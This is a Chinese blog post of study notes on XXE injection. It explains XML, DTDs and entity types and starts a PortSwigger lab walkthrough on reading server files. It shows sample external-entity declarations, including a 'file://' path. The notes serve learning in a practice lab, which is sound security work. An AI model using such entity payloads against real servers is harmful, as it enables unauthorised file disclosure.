<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">



<title>XXE 学习笔记 | C0r1&#39;s Blog</title>



    <link rel="icon" href="/favicon.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


</head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">c0r1&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>

        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">c0r1&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">XXE 学习笔记</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">c0r1</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">November 12, 2019&nbsp;&nbsp;21:07:51</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="&#x524D;&#x8A00;"><a href="#&#x524D;&#x8A00;" class="headerlink" title="&#x524D;&#x8A00;"></a>&#x524D;&#x8A00;</h1><p>&#x521D;&#x6B65;&#x4E86;&#x89E3;&#x8FC7; XXE &#x5374;&#x6CA1;&#x5728;&#x9776;&#x673A;&#x5B9E;&#x6D4B;&#xFF0C;&#x4ECA;&#x5929;&#x53D1;&#x73B0; <a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener"><strong>portswigger</strong></a> &#x6709;&#x5BF9;&#x5E94;&#x73AF;&#x5883;&#xFF0C;&#x51B3;&#x5B9A;&#x91CD;&#x65B0;&#x6574;&#x7406;&#xFF0C;&#x5F3A;&#x5316;&#x7406;&#x89E3;</p>
<p>&#x4F9D;&#x636E; portswigger &#x73AF;&#x5883;&#x8FDB;&#x884C;&#x5206;&#x7C7B;&#xFF0C;&#x8BB0;&#x5F55;&#x57FA;&#x7840;&#x5229;&#x7528;&#x65B9;&#x6CD5;</p>
<h1 id="XXE-&#x7B80;&#x4ECB;"><a href="#XXE-&#x7B80;&#x4ECB;" class="headerlink" title="XXE &#x7B80;&#x4ECB;"></a>XXE &#x7B80;&#x4ECB;</h1><p> <strong>XXE(XML External Entity Injection)</strong> &#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x6CE8;&#x5165;&#x662F;&#x4E00;&#x4E2A; Web &#x5B89;&#x5168;&#x6F0F;&#x6D1E;&#xFF0C;&#x5B83;&#x4F7F;&#x653B;&#x51FB;&#x8005;&#x80FD;&#x591F;&#x5E72;&#x6270;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5BF9; XML &#x6570;&#x636E;&#x7684;&#x5904;&#x7406;&#x3002;&#x901A;&#x5E38;&#x4F7F;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x670D;&#x52A1;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E0E;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x672C;&#x8EAB;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x7684;&#x4EFB;&#x4F55;&#x540E;&#x7AEF;&#x6216;&#x5916;&#x90E8;&#x7CFB;&#x7EDF;&#x8FDB;&#x884C;&#x4EA4;&#x4E92;</p>
<p><img src="https://portswigger.net/web-security/images/xxe-injection.svg" alt="XXE injection"></p>
<p>XXE &#x6F0F;&#x6D1E;&#x7684;&#x51FA;&#x73B0;&#x662F;&#x56E0;&#x4E3A; XML &#x89C4;&#x8303;&#x5305;&#x542B;&#x5404;&#x79CD;&#x6F5C;&#x5728;&#x7684;&#x5371;&#x9669;&#x529F;&#x80FD;&#xFF0C;&#x5E76;&#x4E14;&#x6807;&#x51C6;&#x89E3;&#x6790;&#x5668;&#x652F;&#x6301;&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#xFF0C;&#x5373;&#x4FBF;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x901A;&#x5E38;&#x5E76;&#x4E0D;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;</p>
<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>&#x524D;&#x7F6E;&#x77E5;&#x8BC6;&#x6574;&#x7406;</p>
<h3 id="XML-&#x7B80;&#x4ECB;"><a href="#XML-&#x7B80;&#x4ECB;" class="headerlink" title="XML &#x7B80;&#x4ECB;"></a>XML &#x7B80;&#x4ECB;</h3><p>XML &#x662F;&#x4E00;&#x79CD; &#x201C;&#x53EF;&#x6269;&#x5C55;&#x6807;&#x8BB0;&#x8BED;&#x8A00;&#x201D;&#xFF0C;&#x88AB;&#x8BBE;&#x8BA1;&#x4E8E;&#x6570;&#x636E;&#x7684;&#x5B58;&#x50A8;&#x548C;&#x4F20;&#x8F93;&#x3002;&#x540C; HTML &#x4E00;&#x6837;&#xFF0C;XML &#x4F7F;&#x7528;&#x6811;&#x578B;&#x7ED3;&#x6784;&#x6807;&#x7B7E;&#x548C;&#x6570;&#x636E;&#xFF0C;&#x4E0E; HTML &#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF1A;</p>
<ol>
<li>XML &#x4E0D;&#x4F7F;&#x7528;&#x9884;&#x5B9A;&#x4E49;&#x6807;&#x7B7E;&#xFF0C;&#x53EF;&#x4EE5;&#x7ED9;&#x6807;&#x7B7E;&#x6307;&#x5B9A;&#x63CF;&#x8FF0;&#x6570;&#x636E;&#x7684;&#x540D;&#x79F0;</li>
<li>XML &#x8BED;&#x6CD5;&#x66F4;&#x4E25;&#x683C;&#xFF0C;&#x5176;&#x6807;&#x7B7E;&#x5FC5;&#x987B;&#x95ED;&#x5408;&#x4E14;&#x6B63;&#x786E;&#x5D4C;&#x5957;&#x3002;&#x5176;&#x5927;&#x5C0F;&#x5199;&#x654F;&#x611F;&#x3001;&#x5C5E;&#x6027;&#x503C;&#x5FC5;&#x987B;&#x52A0;&#x5F15;&#x53F7;&#x4E14;&#x4FDD;&#x7559;&#x8FDE;&#x7EED;&#x7A7A;&#x683C;</li>
<li>XML &#x5143;&#x7D20;&#x4EE5;&#x5F62;&#x5982; <code>foo</code> &#x7684;&#x6807;&#x7B7E;&#x5F00;&#x59CB;&#x548C;&#x7ED3;&#x675F;&#xFF0C;&#x5982;&#x679C;&#x5143;&#x7D20;&#x5185;&#x90E8;&#x51FA;&#x73B0;&#x5982; <code>&lt;</code> &#x7684;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#xFF0C;&#x89E3;&#x6790;&#x5C31;&#x4F1A;&#x5931;&#x8D25;&#xFF0C;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;XML &#x7528; <strong>&#x5B9E;&#x4F53;&#x5F15;&#x7528;</strong> (entity reference) &#x66FF;&#x6362;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x3002;XML &#x9884;&#x5B9A;&#x4E49;&#x4E86;&#x4E94;&#x4E2A;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#xFF0C;&#x5373;&#x7528; <code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> &#x66FF;&#x6362; <code>&lt; &gt; &amp; &apos; &quot;</code> </li>
</ol>
<h3 id="XML-&#x5B9E;&#x4F53;"><a href="#XML-&#x5B9E;&#x4F53;" class="headerlink" title="XML &#x5B9E;&#x4F53;"></a>XML &#x5B9E;&#x4F53;</h3><p>XML &#x5B9E;&#x4F53;&#x662F;&#x4E00;&#x79CD;&#x8868;&#x793A; XML &#x6587;&#x6863;&#x4E2D;&#x6570;&#x636E;&#x9879;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x672C;&#x8EAB;&#xFF0C;XML &#x8BED;&#x8A00;&#x89C4;&#x8303;&#x5185;&#x7F6E;&#x4E86;&#x5404;&#x79CD;&#x5B9E;&#x4F53;</p>
<p>&#x5982;&#xFF0C;&#x5B9E;&#x4F53; <code>&amp;lt; and &amp;gt;</code> &#x8868;&#x793A;&#x5B57;&#x7B26; <code>&lt; and &gt;</code>&#xFF0C;&#x8FD9;&#x662F;&#x7528;&#x4E8E;&#x8868;&#x793A; XML &#x6807;&#x7B7E;&#x7684;&#x5143;&#x5B57;&#x7B26;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x5F53;&#x5B83;&#x4EEC;&#x51FA;&#x73B0;&#x5728;&#x6570;&#x636E;&#x4E2D;&#x65F6;&#x901A;&#x5E38;&#x5FC5;&#x987B;&#x4F7F;&#x7528;&#x5B83;&#x4EEC;&#x7684;&#x5B9E;&#x4F53;&#x6765;&#x8868;&#x793A;&#x3002;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#x53EF;&#x4EE5;&#x8D77;&#x5230;&#x7C7B;&#x4F3C;&#x5B8F;&#x5B9A;&#x4E49;&#x548C;&#x6587;&#x4EF6;&#x5305;&#x542B;&#x7684;&#x6548;&#x679C;&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x5E0C;&#x671B;&#x81EA;&#x5B9A;&#x4E49;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#xFF0C;&#x8FD9;&#x4E2A;&#x64CD;&#x4F5C;&#x5728;&#x79F0;&#x4E3A; Document Type Defination&#xFF08;<strong>DTD</strong>&#xFF0C;&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;&#xFF09;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x8FDB;&#x884C; </p>
<h3 id="DTD-&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;"><a href="#DTD-&#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;" class="headerlink" title="DTD - &#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;"></a>DTD - &#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49;</h3><p>XML &#x6587;&#x6863;&#x7C7B;&#x578B;&#x5B9A;&#x4E49; &#xFF08;DTD&#xFF09;&#x5305;&#x542B;&#x4E00;&#x4E9B;&#x58F0;&#x660E;&#xFF0C;&#x8FD9;&#x4E9B;&#x58F0;&#x660E;&#x53EF;&#x4EE5;&#x5B9A;&#x4E49; XML &#x6587;&#x6863;&#x7684;&#x7ED3;&#x6784;&#xFF0C;&#x53EF;&#x4EE5;&#x5305;&#x542B;&#x6570;&#x636E;&#x503C;&#x7684;&#x7C7B;&#x578B;&#x4EE5;&#x53CA;&#x5176;&#x4ED6;&#x9879;&#xFF08;&#x5B9E;&#x4F53;&#x5B9A;&#x4E49;&#xFF09;&#x3002;&#x5728; XML &#x6587;&#x6863;&#x5F00;&#x59CB;&#x5904;&#x53EF;&#x9009;&#x7684; DOCTYPE &#x5143;&#x7D20;&#x5185;&#x58F0;&#x660E;&#x4E86; DTD</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code> &#x79F0;&#x4E3A; <code>XML prolog</code> &#xFF0C;&#x7528;&#x4E8E;&#x58F0;&#x660E; XML &#x6587;&#x6863;&#x7684;&#x7248;&#x672C;&#x548C;&#x7F16;&#x7801;&#xFF0C;&#x662F;&#x53EF;&#x9009;&#x7684;&#xFF0C;&#x5FC5;&#x987B;&#x653E;&#x5728;&#x6587;&#x6863;&#x5F00;&#x5934;&#x3002;standalone &#x503C;&#x662F; yes &#x7684;&#x65F6;&#x5019;&#x8868;&#x793A; DTD &#x4EC5;&#x7528;&#x4E8E;&#x9A8C;&#x8BC1;&#x6587;&#x6863;&#x7ED3;&#x6784;&#xFF0C;&#x4ECE;&#x800C;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x5C06;&#x88AB;&#x7981;&#x7528;&#xFF0C;&#x4F46;&#x5B83;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#x662F; no&#xFF0C;&#x800C;&#x4E14;&#x6709;&#x4E9B;&#x89E3;&#x6790;&#x5668;&#x4F1A;&#x76F4;&#x63A5;&#x5FFD;&#x7565;&#x8FD9;&#x4E00;&#x9879;</p>
<p>DTD &#x53EF;&#x4EE5;&#x5B8C;&#x5168;&#x72EC;&#x7ACB;&#x7684;&#x5305;&#x542B;&#x5728;&#x6587;&#x6863;&#x672C;&#x8EAB;&#x4E2D;&#xFF08;&#x79F0;&#x4E3A; &#x201C;&#x5185;&#x90E8;DTD&#x201D; &#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4ECE;&#x5176;&#x4ED6;&#x4F4D;&#x7F6E;&#x52A0;&#x8F7D;&#xFF08;&#x79F0;&#x4E3A; &#x201C;&#x5916;&#x90E8;DTD&#x201D;&#xFF09;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5C06;&#x4E24;&#x8005;&#x6DF7;&#x5408;&#x4F7F;&#x7528;</p>
<p>&#x4F7F;&#x7528;&#x65B9;&#x5F0F;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!- &#x5185;&#x90E8; DTD --&gt;</span><br><span class="line">&lt;!DOCTYPE foo [&#x5143;&#x7D20;&#x58F0;&#x660E;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!- &#x5916;&#x90E8; DTD --&gt;</span><br><span class="line">&lt;!DOCTYPE foo SYSTEM &quot;&#x5B58;&#x653E;&#x5143;&#x7D20;&#x58F0;&#x660E;&#x7684;&#x6587;&#x4EF6;&#x7684;URI&#xFF0C;&#x53EF;&#x4EE5;&#x662F;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x6216;&#x7F51;&#x7EDC;&#x6587;&#x4EF6;&quot; [&#x53EF;&#x9009;&#x7684;&#x5143;&#x7D20;&#x58F0;&#x660E;]&gt;</span><br><span class="line">&lt;!DOCTYPE foo PUBLIC &quot;PUBLIC_ID DTD&#x7684;&#x540D;&#x79F0;&quot; &quot;&#x5916;&#x90E8;DTD&#x6587;&#x4EF6;&#x7684;URI&quot;&gt;</span><br><span class="line">&lt;!- PUBLIC&#x8868;&#x793A; DTD &#x6587;&#x4EF6;&#x662F;&#x516C;&#x5171;&#x7684;&#xFF0C;&#x89E3;&#x6790;&#x5668;&#x5148;&#x5206;&#x6790; DTD &#x540D;&#x79F0;&#xFF0C;&#x6CA1;&#x67E5;&#x5230;&#x518D;&#x53BB;&#x8BBF;&#x95EE; URI --&gt;</span><br></pre></td></tr></table></figure>

<h3 id="XML-&#x81EA;&#x5B9A;&#x4E49;&#x5B9E;&#x4F53;"><a href="#XML-&#x81EA;&#x5B9A;&#x4E49;&#x5B9E;&#x4F53;" class="headerlink" title="XML &#x81EA;&#x5B9A;&#x4E49;&#x5B9E;&#x4F53;"></a>XML &#x81EA;&#x5B9A;&#x4E49;&#x5B9E;&#x4F53;</h3><p>XML &#x5141;&#x8BB8;&#x5728; DTD &#x4E2D;&#x5B9A;&#x4E49;&#x81EA;&#x5B9A;&#x4E49;&#x5B9E;&#x4F53;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#x5185;&#x90E8;&#x5B9E;&#x4F53; --&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p>&#x6B64;&#x5B9A;&#x4E49;&#x610F;&#x5473;&#x7740;&#x5728; XML &#x6587;&#x6863;&#x4E2D;&#x5BF9;&#x4EFB;&#x4F55;&#x4F7F;&#x7528;&#x5B9E;&#x4F53;&#x5F15;&#x7528;&#xFF1A; <code>&amp;myentity;</code> &#x7684;&#x5185;&#x5BB9;&#x90FD;&#x66FF;&#x6362;&#x4E3A;&#x5B9A;&#x4E49;&#x7684;&#x503C;&#xFF1A;<code>my entity value</code></p>
<h3 id="XML-&#x5916;&#x90E8;&#x5B9E;&#x4F53;"><a href="#XML-&#x5916;&#x90E8;&#x5B9E;&#x4F53;" class="headerlink" title="XML &#x5916;&#x90E8;&#x5B9E;&#x4F53;"></a>XML &#x5916;&#x90E8;&#x5B9E;&#x4F53;</h3><p>XML &#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x662F;&#x4E00;&#x79CD;&#x81EA;&#x5B9A;&#x4E49;&#x5B9E;&#x4F53;&#xFF0C;&#x5176;&#x5B9A;&#x4E49;&#x4F4D;&#x4E8E;&#x58F0;&#x660E;&#x5B83;&#x7684; DTD &#x6587;&#x4EF6;&#x4E4B;&#x5916;</p>
<p>&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x7684;&#x58F0;&#x660E;&#x4F7F;&#x7528; <code>SYSTEM</code> &#x5173;&#x952E;&#x5B57;&#xFF0C;&#x5E76;&#x4E14;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x4E00;&#x4E2A; URL&#xFF0C;&#x4ECE;&#x8BE5; URL &#x52A0;&#x8F7D;&#x5B9E;&#x4F53;&#x7684;&#x503C;&#x3002;&#x4F8B;&#x5982;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#x5916;&#x90E8;&#x5B9E;&#x4F53; --&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p>URL &#x53EF;&#x4EE5;&#x4F7F;&#x7528; <code>file://</code> &#x534F;&#x8BAE;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x4ECE;&#x6587;&#x4EF6;&#x4E2D;&#x52A0;&#x8F7D;&#x5B9E;&#x4F53;&#x3002;&#x4F8B;&#x5982;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- &#x5916;&#x90E8;&#x5B9E;&#x4F53; --&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</span><br></pre></td></tr></table></figure>

<p>XML &#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x63D0;&#x4F9B;&#x4E86;&#x5F15;&#x53D1; XML &#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x7684;&#x4E3B;&#x8981;&#x65B9;&#x6CD5;&#xFF08;&#x72D7;&#x5934;</p>
<p>&#x4E0B;&#x56FE;&#x662F; URI &#x652F;&#x6301;&#x7684;&#x534F;&#x8BAE;&#xFF1A;</p>
<p><img src="https://findneo.github.io/180811-xxe-injection/1534066968195.png" alt="scheme support"></p>
<h3 id="&#x901A;&#x7528;&#x5B9E;&#x4F53;&#x548C;&#x53C2;&#x6570;&#x5B9E;&#x4F53;"><a href="#&#x901A;&#x7528;&#x5B9E;&#x4F53;&#x548C;&#x53C2;&#x6570;&#x5B9E;&#x4F53;" class="headerlink" title="&#x901A;&#x7528;&#x5B9E;&#x4F53;&#x548C;&#x53C2;&#x6570;&#x5B9E;&#x4F53;"></a>&#x901A;&#x7528;&#x5B9E;&#x4F53;&#x548C;&#x53C2;&#x6570;&#x5B9E;&#x4F53;</h3><p>&#x6839;&#x636E;&#x5F15;&#x7528;&#x65B9;&#x5F0F;&#x7684;&#x4E0D;&#x540C;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x901A;&#x7528;&#x5B9E;&#x4F53;&#x548C;&#x53C2;&#x6570;&#x5B9E;&#x4F53;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#x58F0;&#x660E;&#xFF1A;</span><br><span class="line">&lt;!DOCTYPE &#x6839;&#x5143;&#x7D20; [&lt;!ENTITY &#x901A;&#x7528;&#x5B9E;&#x4F53;&#x540D; &quot;&#x5B9E;&#x4F53;&#x6240;&#x4EE3;&#x8868;&#x7684;&#x5B57;&#x7B26;&#x4E32;&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE &#x6839;&#x5143;&#x7D20; [&lt;!ENTITY % &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x540D; &quot;&#x5B9E;&#x4F53;&#x6240;&#x4EE3;&#x8868;&#x7684;&#x5B57;&#x7B26;&#x4E32;&quot;&gt;]&gt;</span><br><span class="line"></span><br><span class="line">&#x5F15;&#x7528;&#xFF1A;</span><br><span class="line">&lt;!- &#x7ECF;&#x5B9E;&#x9A8C;&#xFF0C;&#x666E;&#x901A;&#x5B9E;&#x4F53;&#x65E2;&#x53EF;&#x4EE5;&#x5728; DTD &#x4E2D;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728; XML &#x4E2D;&#x5F15;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x58F0;&#x660E;&#x524D;&#x5F15;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x5728;&#x5143;&#x7D20;&#x58F0;&#x660E;&#x5185;&#x90E8;&#x5F15;&#x7528; --&gt;</span><br><span class="line">&amp;&#x901A;&#x7528;&#x5B9E;&#x4F53;&#x540D;;</span><br><span class="line"></span><br><span class="line">&lt;!- &#x7ECF;&#x5B9E;&#x9A8C;&#xFF0C;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x53EA;&#x80FD;&#x5728; DTD &#x4E2D;&#x5F15;&#x7528;&#xFF0C;&#x4E0D;&#x80FD;&#x5728;&#x58F0;&#x660E;&#x524D;&#x5F15;&#x7528;,&#x4E0D;&#x80FD;&#x5728;&#x5143;&#x7D20;&#x58F0;&#x660E;&#x5185;&#x90E8;&#x5F15;&#x7528; --&gt;</span><br><span class="line">%&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x540D;;</span><br></pre></td></tr></table></figure>

<h1 id="&#x666E;&#x901A;-XXE"><a href="#&#x666E;&#x901A;-XXE" class="headerlink" title="&#x666E;&#x901A; XXE"></a>&#x666E;&#x901A; XXE</h1><p>&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x672A;&#x9488;&#x5BF9; XXE &#x8FDB;&#x884C;&#x9632;&#x5FA1;&#xFF0C;&#x4E14;&#x6709;&#x6570;&#x636E;&#x56DE;&#x663E;&#x7684;&#x60C5;&#x51B5;</p>
<p><strong>&#x6CE8;&#x610F;&#xFF1A;&#x5F53;&#x8BFB;&#x53D6;&#x6587;&#x672C;&#x4E2D;&#x6709;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x65F6;&#xFF0C;&#x4F1A;&#x5F15;&#x53D1; XML &#x89E3;&#x6790;&#x9519;&#x8BEF;&#xFF0C;&#x5B9E;&#x9A8C;&#x73AF;&#x5883;&#x672A;&#x6D89;&#x53CA;&#xFF0C;&#x672C;&#x6587;&#x4E0D;&#x6D89;&#x53CA;</strong></p>
<h2 id="&#x5229;&#x7528;-XXE-&#x6765;&#x68C0;&#x7D22;&#x6587;&#x4EF6;"><a href="#&#x5229;&#x7528;-XXE-&#x6765;&#x68C0;&#x7D22;&#x6587;&#x4EF6;" class="headerlink" title="&#x5229;&#x7528; XXE &#x6765;&#x68C0;&#x7D22;&#x6587;&#x4EF6;"></a>&#x5229;&#x7528; XXE &#x6765;&#x68C0;&#x7D22;&#x6587;&#x4EF6;</h2><p>&#x8981;&#x6267;&#x884C;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E2D;&#x68C0;&#x7D22;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x7684; XXE &#x6CE8;&#x5165;&#x653B;&#x51FB;&#xFF0C;&#x9700;&#x8981;&#x4EE5;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x4FEE;&#x6539;&#x63D0;&#x4EA4;&#x7684; XML</p>
<ol>
<li>&#x5F15;&#x5165;&#xFF08;&#x6216;&#x7F16;&#x8F91;&#xFF09;&#x4E00;&#x4E2A; DOCTYPE &#x5143;&#x7D20;&#xFF0C;&#x8BE5;&#x5143;&#x7D20;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x5305;&#x542B;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x7684;&#x5916;&#x90E8;&#x5B9E;&#x4F53;</li>
<li>&#x4F7F;&#x7528;&#x5DF2;&#x5B9A;&#x4E49;&#x7684;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#xFF0C;&#x83B7;&#x53D6;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x54CD;&#x5E94;&#x4E2D;&#x8FD4;&#x56DE;&#x7684; XML &#x6570;&#x636E;</li>
</ol>
<p>&#x8FDB;&#x5230;&#x5BF9;&#x5E94;&#x73AF;&#x5883;&#xFF1A;<a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank" rel="noopener">Lab: Exploiting XXE using external entities to retrieve files</a></p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/1.png" alt="image-20191113094048429"></p>
<p>&#x5728;&#x5546;&#x54C1;&#x8BE6;&#x60C5;&#x4E2D;&#x70B9;&#x51FB; <code>Check stock</code>&#xFF0C;&#x5728; BurpSuite &#x4E2D;&#x83B7;&#x53D6;&#x5230;&#x5982;&#x4E0B;&#x8BF7;&#x6C42;&#x5305;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/2.png" alt="image-20191113100611447"></p>
